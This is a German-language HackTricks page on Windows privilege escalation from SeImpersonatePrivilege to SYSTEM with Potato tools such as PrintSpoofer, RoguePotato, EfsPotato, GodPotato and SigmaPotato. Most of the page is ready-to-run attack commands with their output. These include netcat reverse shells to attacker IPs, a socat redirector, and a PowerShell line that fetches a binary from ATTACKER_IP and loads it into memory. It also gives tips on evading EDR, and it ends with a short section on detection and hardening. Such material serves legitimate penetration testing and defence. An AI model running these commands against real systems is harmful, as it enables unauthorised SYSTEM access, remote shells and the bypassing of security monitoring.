# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato funktioniert nicht mehr** unter Windows Server 2019 und Windows 10 Build 1809 und neuer. Allerdings können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** verwendet werden, um dieselben Privilegien auszunutzen und `NT AUTHORITY\SYSTEM`-Zugriff zu erlangen. Dieser [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) geht ausführlich auf das `PrintSpoofer`-Tool ein, mit dem Impersonation-Privilegien auf Windows 10- und Server-2019-Hosts missbraucht werden können, auf denen JuicyPotato nicht mehr funktioniert.

> [!TIP]
> Eine moderne Alternative, die 2024–2025 häufig gepflegt wird, ist SigmaPotato (ein Fork von GodPotato), das In-Memory/.NET-Reflection-Nutzung und erweiterten OS-Support hinzufügt. Siehe Kurzanleitung unten und das Repo in den Referenzen.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Anforderungen und häufige Fallstricke

Alle folgenden Techniken basieren darauf, einen zur Impersonation fähigen privilegierten Dienst aus einem Kontext auszunutzen, der eine der folgenden Privilegien besitzt:

- SeImpersonatePrivilege (am häufigsten) oder SeAssignPrimaryTokenPrivilege
- Hohe Integrität ist nicht erforderlich, wenn der Token bereits SeImpersonatePrivilege besitzt (typisch für viele Servicekonten wie IIS AppPool, MSSQL, usw.)

Privilegien schnell prüfen:
```cmd
whoami /priv | findstr /i impersonate
```
Betriebliche Hinweise:

- Wenn Ihre Shell unter einem eingeschränkten Token ohne SeImpersonatePrivilege läuft (üblich für Local Service/Network Service in manchen Kontexten), stellen Sie die Standardprivilegien des Kontos mit FullPowers wieder her und führen dann einen Potato aus. Beispiel: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer benötigt, dass der Print Spooler-Dienst läuft und über den lokalen RPC-Endpunkt (spoolss) erreichbar ist. In gehärteten Umgebungen, in denen der Spooler nach PrintNightmare deaktiviert wurde, bevorzugen Sie RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benötigt einen OXID-Resolver, der über TCP/135 erreichbar ist. Wenn egress geblockt ist, verwenden Sie einen Redirector/Port-Forwarder (siehe Beispiel unten). Ältere Builds benötigten das -f Flag.
- EfsPotato/SharpEfsPotato missbrauchen MS-EFSR; wenn eine Pipe blockiert ist, versuchen Sie alternative Pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fehler 0x6d3 während RpcBindingSetAuthInfo deutet typischerweise auf einen unbekannten/nicht unterstützten RPC-Authentifizierungsdienst hin; versuchen Sie eine andere Pipe/Transport oder stellen Sie sicher, dass der Zieldienst läuft.

## Schnelle Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Hinweise:
- Du kannst -i verwenden, um einen interaktiven Prozess in der aktuellen Konsole zu starten, oder -c, um einen One-Liner auszuführen.
- Benötigt den Spooler-Dienst. Wenn dieser deaktiviert ist, wird dies fehlschlagen.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Wenn ausgehender Port 135 blockiert ist, pivot den OXID resolver via socat auf deinem redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Tipp: Wenn eine pipe fehlschlägt oder EDR sie blockiert, versuche die anderen unterstützten pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Hinweise:
- Funktioniert unter Windows 8/8.1–11 und Server 2012–2022, wenn SeImpersonatePrivilege vorhanden ist.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bietet zwei Varianten, die Service-DCOM-Objekte angreifen, die standardmäßig auf RPC_C_IMP_LEVEL_IMPERSONATE eingestellt sind. Kompilieren Sie die bereitgestellten binaries oder verwenden Sie sie und führen Sie Ihren Befehl aus:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (aktualisierter GodPotato-Fork)

SigmaPotato fügt moderne Annehmlichkeiten hinzu, wie In-Memory-Ausführung über .NET reflection und ein PowerShell reverse shell Hilfsprogramm.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Erkennungs- und Härtungshinweise

- Überwachen Sie Prozesse, die named pipes erstellen und sofort token-duplication APIs aufrufen, gefolgt von CreateProcessAsUser/CreateProcessWithTokenW. Sysmon kann nützliche Telemetrie liefern: Event ID 1 (process creation), 17/18 (named pipe created/connected) und Kommandozeilen, die Kindprozesse als SYSTEM starten.
- Spooler-Härtung: Das Deaktivieren des Print Spooler service auf Servern, auf denen er nicht benötigt wird, verhindert lokale PrintSpoofer-ähnliche Privilegienausnutzungen über spoolss.
- Service account Härtung: Minimieren Sie die Zuweisung von SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege an benutzerdefinierte Dienste. Ziehen Sie in Betracht, Dienste unter virtuellen Konten mit den geringstmöglichen Rechten auszuführen und sie, wenn möglich, mit service SID und write-restricted tokens zu isolieren.
- Netzwerk-Kontrollen: Das Blockieren ausgehender TCP/135-Verbindungen oder das Einschränken von RPC endpoint mapper traffic kann RoguePotato unterbrechen, sofern kein internal redirector verfügbar ist.
- EDR/AV: All of these tools are widely signatured. Das Neukompilieren aus dem Quellcode, Umbenennen von Symbolen/Strings oder die in-memory Ausführung kann die Erkennung reduzieren, wird aber robuste verhaltensbasierte Erkennungen nicht umgehen.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
